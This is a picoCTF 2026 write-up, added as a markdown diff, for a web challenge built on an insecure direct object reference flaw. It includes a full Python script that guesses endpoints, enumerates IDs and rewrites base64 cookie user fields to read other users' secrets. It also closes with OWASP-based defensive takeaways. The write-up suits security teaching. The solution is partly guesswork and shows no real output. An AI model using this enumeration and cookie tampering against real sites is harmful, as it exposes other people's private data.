@@ -1,0 +1,413 @@
+---
+title: "Secret Box — picoCTF 2026"
+date: 2026-06-26
+author: "Ian Mattas"
+slug: "picoctf-2026-secret-box"
+order: 68
+writeupKind: "challenge"
+ctfSlug: "picoctf-2026"
+ctfTitle: "picoCTF 2026"
+---
+
+# Secret Box — picoCTF 2026
+
+> **Category:** `Web Exploitation`  
+> **Difficulty:** Medium  
+> **Points:** 200  
+> **Author:** Imattas aka Zemi
+
+---
+
+## Challenge Description
+
+> This secret box is designed to conceal your secrets. It's perfectly secure -- only you can see what's inside. Or can you? Try to uncover secrets that don't belong to you.
+
+---
+
+## Recon / Initial Analysis
+
+This challenge presents a web application that allows users to store and retrieve "secrets" in their personal box. The description strongly hints at an **Insecure Direct Object Reference (IDOR)** vulnerability -- the claim that "only you can see what's inside" combined with the prompt to "uncover secrets that don't belong to you" is a classic IDOR setup.
+
+### Attack Surface
+
+Common IDOR patterns in web CTF challenges:
+- **URL path parameters**: `/api/secrets/1`, `/api/secrets/2`, etc.
+- **Query parameters**: `/view?id=1`, `/view?secret_id=1`
+- **Cookie values**: A cookie like `user_id=5` or `box_id=abc123`
+- **POST body parameters**: `{"secret_id": 1}` in JSON requests
+- **HTTP headers**: Custom headers carrying user/session identifiers
+
+The flag is typically stored in another user's secret box (often user ID 0, 1, or an admin account) that can be accessed by modifying the reference.
+
+---
+
+## Vulnerability / Observation
+
+**IDOR (Insecure Direct Object Reference)** occurs when an application exposes internal object references (such as database IDs, sequential numbers, or predictable tokens) in a way that allows an attacker to manipulate them and access other users' data without proper authorization checks.
+
+In this challenge, the web application likely:
+1. Assigns each user a numeric or sequential identifier (e.g., user ID, box ID, or secret ID)
+2. Uses this identifier in API requests or URL parameters to retrieve secrets
+3. Fails to verify that the requesting user is authorized to access the requested resource
+
+---
+
+## Exploitation / Solution
+
+### Step 1: Create an Account and Store a Secret
+Navigate to the challenge URL and interact with the application normally:
+- Register or log in (if registration is available)
+- Store a test secret in your box
+- Observe the resulting requests in your browser's Developer Tools (Network tab)
+
+### Step 2: Identify the Object Reference
+Examine the HTTP requests when viewing your secret. Look for:
+- The URL structure (e.g., `/api/box/7` or `/secret?id=42`)
+- Cookie values that contain identifiers
+- Request/response bodies with ID fields
+
+For example, you might see a request like:
+```
+GET /api/secret?id=42 HTTP/1.1
+Cookie: session=<your_token>
+```
+
+Or the secret might be fetched via:
+```
+GET /api/box/7
+```
+
+### Step 3: Enumerate Other Users' Secrets
+Modify the identifier to access other users' secrets. Iterate through possible IDs:
+```
+GET /api/secret?id=1
+GET /api/secret?id=2
+...
+GET /api/secret?id=0
+GET /api/secret?id=admin
+```
+
+### Step 4: Find the Flag
+One of the secrets belonging to another user will contain the flag in the format `picoCTF{...}`. This is typically at a low ID number (ID 0 or 1 for the first/admin user) or may require iterating through several IDs.
+
+### Method: Cookie/Session Manipulation
+If the IDOR is cookie-based, you may need to:
+1. Decode your session cookie (often base64 or JWT)
+2. Modify the user ID field within it
+3. Re-encode and send the modified cookie
+
+---
+
+## Full Exploit Script
+
+```python
+#!/usr/bin/env python3
+"""
+Secret Box - picoCTF 2026
+Category: Web Exploitation | Points: 200
+
+Automated IDOR exploitation script to enumerate other users' secrets
+and find the flag.
+
+Usage:
+    pip install requests
+    python3 solve.py
+
+    Set environment variables to configure:
+        TARGET_URL=http://<challenge_url> python3 solve.py
+"""
+
+import os
+import sys
+import re
+import json
+import base64
+import requests
+from urllib.parse import urljoin
+
+# --- Configuration ---
+TARGET_URL = os.environ.get("TARGET_URL", "http://rhea.picoctf.net:60506")
+FLAG_PATTERN = re.compile(r"picoCTF\{[^}]+\}")
+
+# Range of IDs to enumerate
+ID_RANGE_START = int(os.environ.get("ID_START", "0"))
+ID_RANGE_END = int(os.environ.get("ID_END", "100"))
+
+# Common API endpoint patterns for IDOR vulnerabilities
+ENDPOINT_PATTERNS = [
+    "/api/secret?id={id}",
+    "/api/secrets/{id}",
+    "/api/box/{id}",
+    "/api/box?id={id}",
+    "/secret/{id}",
+    "/secret?id={id}",
+    "/box/{id}",
+    "/box?id={id}",
+    "/view?id={id}",
+    "/view/{id}",
+    "/api/user/{id}/secret",
+    "/api/users/{id}/secret",
+    "/api/v1/secrets/{id}",
+]
+
+
+def discover_endpoints(session, base_url):
+    """Try to discover the correct API endpoint by testing common patterns."""
+    print("[*] Discovering API endpoints...")
+
+    # First, try to access the main page and look for API hints
+    try:
+        resp = session.get(base_url, timeout=10)
+        body = resp.text
+
+        # Look for JavaScript API calls, fetch URLs, etc.
+        api_patterns = re.findall(r'["\'](/api/[^"\']+)["\']', body)
+        fetch_patterns = re.findall(r'fetch\(["\']([^"\']+)["\']', body)
+        href_patterns = re.findall(r'href=["\']([^"\']*(?:secret|box|view)[^"\']*)["\']', body)
+
+        discovered = set(api_patterns + fetch_patterns + href_patterns)
+        if discovered:
+            print(f"[+] Discovered endpoints from page source: {discovered}")
+            return list(discovered)
+    except Exception as e:
+        print(f"[!] Error accessing main page: {e}")
+
+    # Try common paths to see which ones return non-404
+    working_endpoints = []
+    for pattern in ENDPOINT_PATTERNS:
+        test_url = urljoin(base_url, pattern.format(id=1))
+        try:
+            resp = session.get(test_url, timeout=5)
+            if resp.status_code != 404:
+                print(f"[+] Endpoint responds ({resp.status_code}): {pattern}")
+                working_endpoints.append(pattern)
+        except Exception:
+            pass
+
+    return working_endpoints if working_endpoints else ENDPOINT_PATTERNS
+
+
+def try_cookie_idor(session, base_url):
+    """Check if the IDOR is in cookies rather than URL parameters."""
+    print("\n[*] Checking for cookie-based IDOR...")
+
+    # First, make a request to get cookies
+    try:
+        resp = session.get(base_url, timeout=10)
+    except Exception as e:
+        print(f"[!] Error: {e}")
+        return None
+
+    cookies = session.cookies.get_dict()
+    if not cookies:
+        print("[-] No cookies set.")
+        return None
+
+    print(f"[*] Current cookies: {cookies}")
+
+    for cookie_name, cookie_value in cookies.items():
+        # Try to decode base64 cookies
+        try:
+            decoded = base64.b64decode(cookie_value).decode("utf-8", errors="ignore")
+            print(f"[*] Cookie '{cookie_name}' base64 decoded: {decoded}")
+
+            # Try to parse as JSON and modify user/id fields
+            try:
+                data = json.loads(decoded)
+                for key in ["id", "user_id", "userId", "uid", "box_id", "boxId", "user", "secret_id"]:
+                    if key in data:
+                        original_val = data[key]
+                        print(f"[*] Found modifiable field '{key}' = {original_val}")
+
+                        # Try different IDs
+                        for test_id in range(ID_RANGE_START, min(ID_RANGE_END, 50)):
+                            data[key] = test_id
+                            modified = base64.b64encode(
+                                json.dumps(data).encode()
+                            ).decode()
+                            session.cookies.set(cookie_name, modified)
+
+                            resp = session.get(base_url, timeout=5)
+                            match = FLAG_PATTERN.search(resp.text)
+                            if match:
+                                print(f"\n[+] FLAG FOUND with {key}={test_id}: {match.group(0)}")
+                                return match.group(0)
+
+                        # Restore original
+                        data[key] = original_val
+            except json.JSONDecodeError:
+                pass
+        except Exception:
+            pass
+
+        # Try simple numeric cookie manipulation
+        if cookie_value.isdigit():
+            print(f"[*] Cookie '{cookie_name}' is numeric ({cookie_value}), trying IDOR...")
+            for test_id in range(ID_RANGE_START, min(ID_RANGE_END, 50)):
+                session.cookies.set(cookie_name, str(test_id))
+                resp = session.get(base_url, timeout=5)
+                match = FLAG_PATTERN.search(resp.text)
+                if match:
+                    print(f"\n[+] FLAG FOUND with {cookie_name}={test_id}: {match.group(0)}")
+                    return match.group(0)
+
+    return None
+
+
+def try_url_idor(session, base_url, endpoints):
+    """Try IDOR via URL parameter/path enumeration."""
+    print("\n[*] Attempting URL-based IDOR enumeration...")
+
+    for pattern in endpoints:
+        print(f"\n[*] Testing endpoint pattern: {pattern}")
+        for test_id in range(ID_RANGE_START, ID_RANGE_END + 1):
+            url = urljoin(base_url, pattern.format(id=test_id))
+            try:
+                resp = session.get(url, timeout=5)
+
+                if resp.status_code == 200:
+                    match = FLAG_PATTERN.search(resp.text)
+                    if match:
+                        print(f"\n[+] FLAG FOUND at {url}: {match.group(0)}")
+                        return match.group(0)
+
+                    # Check for interesting content
+                    if test_id <= 5:
+                        try:
+                            data = resp.json()
+                            if data:
+                                print(f"  [*] id={test_id}: {json.dumps(data)[:200]}")
+                        except Exception:
+                            if len(resp.text) > 10 and "error" not in resp.text.lower():
+                                print(f"  [*] id={test_id}: {resp.text[:200]}")
+                elif resp.status_code == 403:
+                    if test_id <= 2:
+                        print(f"  [*] id={test_id}: 403 Forbidden (auth check exists)")
+                elif resp.status_code not in (404, 400):
+                    if test_id <= 5:
+                        print(f"  [*] id={test_id}: HTTP {resp.status_code}")
+
+            except requests.exceptions.Timeout:
+                continue
+            except Exception as e:
+                if test_id == ID_RANGE_START:
+                    print(f"  [!] Error: {e}")
+                    break
+
+    return None
+
+
+def try_post_idor(session, base_url):
+    """Try IDOR via POST request body manipulation."""
+    print("\n[*] Attempting POST-based IDOR...")
+
+    post_endpoints = ["/api/secret", "/api/box", "/api/view", "/secret", "/box"]
+    post_fields = ["id", "secret_id", "box_id", "user_id", "userId"]
+
+    for endpoint in post_endpoints:
+        url = urljoin(base_url, endpoint)
+        for field in post_fields:
+            for test_id in range(ID_RANGE_START, min(ID_RANGE_END, 20)):
+                try:
+                    # Try JSON body
+                    resp = session.post(
+                        url,
+                        json={field: test_id},
+                        timeout=5
+                    )
+                    if resp.status_code == 200:
+                        match = FLAG_PATTERN.search(resp.text)
+                        if match:
+                            print(f"\n[+] FLAG FOUND via POST {url} {{{field}: {test_id}}}: {match.group(0)}")
+                            return match.group(0)
+
+                    # Try form body
+                    resp = session.post(
+                        url,
+                        data={field: test_id},
+                        timeout=5
+                    )
+                    if resp.status_code == 200:
+                        match = FLAG_PATTERN.search(resp.text)
+                        if match:
+                            print(f"\n[+] FLAG FOUND via POST {url} {field}={test_id}: {match.group(0)}")
+                            return match.group(0)
+                except Exception:
+                    break
+
+    return None
+
+
+def main():
+    print("=" * 60)
+    print("  Secret Box - picoCTF 2026 Solver")
+    print("  Category: Web Exploitation | Points: 200")
+    print("=" * 60)
+    print(f"  Target: {TARGET_URL}")
+    print(f"  ID Range: {ID_RANGE_START} - {ID_RANGE_END}")
+    print()
+
+    session = requests.Session()
+    session.headers.update({
+        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+    })
+
+    # Phase 1: Discover endpoints
+    endpoints = discover_endpoints(session, TARGET_URL)
+
+    # Phase 2: Try cookie-based IDOR
+    flag = try_cookie_idor(session, TARGET_URL)
+    if flag:
+        print(f"\n{'='*60}")
+        print(f"  FLAG: {flag}")
+        print(f"{'='*60}")
+        return
+
+    # Phase 3: Try URL-based IDOR
+    flag = try_url_idor(session, TARGET_URL, endpoints)
+    if flag:
+        print(f"\n{'='*60}")
+        print(f"  FLAG: {flag}")
+        print(f"{'='*60}")
+        return
+
+    # Phase 4: Try POST-based IDOR
+    flag = try_post_idor(session, TARGET_URL)
+    if flag:
+        print(f"\n{'='*60}")
+        print(f"  FLAG: {flag}")
+        print(f"{'='*60}")
+        return
+
+    print("\n[-] Flag not found automatically.")
+    print("[*] Manual investigation tips:")
+    print("    1. Open the challenge URL in a browser")
+    print("    2. Create an account and store a secret")
+    print("    3. Use Browser DevTools (F12 > Network tab) to observe API calls")
+    print("    4. Look for sequential IDs in URLs, cookies, or request bodies")
+    print("    5. Modify the ID to access other users' secrets")
+    print("    6. Check for JWT tokens: decode at jwt.io and modify the user ID")
+    print(f"    7. Try: curl {TARGET_URL}/api/secret?id=0")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## Key Takeaways
+
+- **IDOR** is an authorization flaw: the app trusts a client-supplied object reference (ID in a URL, cookie, or body) without checking the requester owns that object.
+- The exploit is simply enumerating the reference — low IDs (0 or 1) often belong to the admin/first user and hold the flag.
+- Always inspect requests with browser DevTools (Network tab) to locate the object reference, and check for the reference hiding inside base64/JWT cookies.
+- The reference can live in URL paths, query strings, cookies, or POST bodies — test all of them.
+
+---
+
+## References
+
+- [OWASP — Insecure Direct Object Reference Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
+- [OWASP API Security Top 10 — Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
+- [PortSwigger Web Security Academy — Access control / IDOR](https://portswigger.net/web-security/access-control/idor)
+- [jwt.io](https://jwt.io/)
